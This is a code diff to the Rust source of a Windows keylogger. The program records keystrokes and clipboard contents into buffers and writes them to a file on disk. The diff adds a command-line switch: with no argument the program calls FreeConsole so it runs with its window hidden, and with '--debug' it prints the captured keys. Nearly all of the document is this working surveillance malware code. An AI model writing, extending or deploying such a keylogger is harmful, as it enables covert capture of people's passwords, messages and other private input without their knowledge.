@@ -6,6 +6,7 @@ use winapi::um::wincon::FreeConsole;
 use std::io::{stdout, Write, ErrorKind, Error};
 use std::fs::{File, OpenOptions};
 use std::thread;
+use std::env;
 
 /**Function writes logged data to a file on the disk.
  * Params:
@@ -84,7 +85,27 @@ fn write_to_disk(file_name: &str, content: &str, bytes: usize) -> bool {
 
 #[allow(unused_assignments)]
 fn main() {
-  unsafe { FreeConsole(); }                                 // Starts the process without a console window.
+  let mut dbg: bool = false;
+  let mod_name = get_module_name();
+  let args: Vec<String> = env::args().collect();
+
+  if args.len() == 1 {
+    unsafe { FreeConsole(); }
+  }
+  else if args.len() == 2 {
+    let flag = &args[1];
+    if flag.contains("--debug") { dbg = true; }
+  }
+  else {
+    eprintln!(
+      "Syntax:
+        {}         {{Hides the console window}}
+        {} --debug {{Shows the console window}}"
+    , mod_name, mod_name);
+
+    return;
+  }
+
   let keys = KbKeys::new();                         // Creates the structure that stores the virtual key codes.
   let mut buffer = "".to_owned();                   // The buffer that holds the data to be logged.
   let mut clip_buffer = "".to_owned();              // Buffer holds data from the clipboard.
@@ -124,7 +145,7 @@ fn main() {
           );
         });
 
-        if DBG == true { println!("Successfully released buffer"); }
+        if dbg == true { println!("Successfully released buffer"); }
 
         buffer.clear();
         write_counter = 0;
@@ -198,7 +219,7 @@ fn main() {
         }
       }
 
-      if DBG == true {
+      if dbg == true {
         if key.contains("IGNORE") == false {
           print!("{}", key);
         }
@@ -211,7 +232,7 @@ fn main() {
       unsafe { Sleep (1); }
     }
 
-    if DBG == true {
+    if dbg == true {
       println!("{} idx:{} len:{}", buffer, c_pos, buffer.len());
       if clip_buffer.len() > 0 { println!("Clipboard: {}", clip_buffer); }
     }
@@ -223,4 +244,4 @@ fn main() {
       }
     }
   }
-} // fn main
+}
